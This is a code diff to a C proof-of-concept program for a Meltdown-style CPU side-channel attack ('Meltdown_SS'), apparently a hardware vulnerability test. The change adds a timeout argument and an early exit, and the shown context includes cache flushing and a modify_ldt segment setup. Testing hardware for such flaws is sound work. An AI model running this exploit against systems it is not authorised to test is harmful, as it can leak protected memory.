@@ -58,13 +58,15 @@ void inline __attribute__((always_inline)) seg_fail(void)
 
 int main(int argc, char **argv)
 {
-    if (argc != 3)
+    if (argc != 4)
     {
-        printf("Usage\t: ./poc_* [pagesize] [threshold]\nExample\t: ./poc_x86 4096 200\n");
+        printf("Usage\t: ./poc_* [pagesize] [threshold] [timeout]\nExample\t: ./poc_x86 4096 200 120\n");
         return 0;
     }
     sscanf(argv[1], "%d", &pagesize);
     sscanf(argv[2], "%d", &CACHE_MISS);
+    sscanf(argv[3], "%ld", &timeout);
+    timeout *= CLOCKS_PER_SEC;
     int passed_count = 0;
     printf("Meltdown_SS Begins...\n");
     if (syscall(__NR_modify_ldt, 1, &my_desc_ok, sizeof(struct user_desc)))
@@ -80,7 +82,7 @@ int main(int argc, char **argv)
     {
         flush(mem2 + i * 4096);
     }
-
+    start_time = clock();
     for (int r = 0; r < MAX_TRY_TIMES; r++)
     {
         // Ensure data is in the cache
@@ -116,7 +118,12 @@ int main(int argc, char **argv)
         {
             passed_count++;
         }
-        
+        if (clock() - start_time > timeout)
+        {
+            printf(ANSI_COLOR_YELLOW "Meltdown_SS: Timeout\n" ANSI_COLOR_RESET);
+            printf("Meltdown_SS Done!\n\n");
+            exit(-1);
+        }
         flush(&dummy);
     }
     int exit_result = 0;
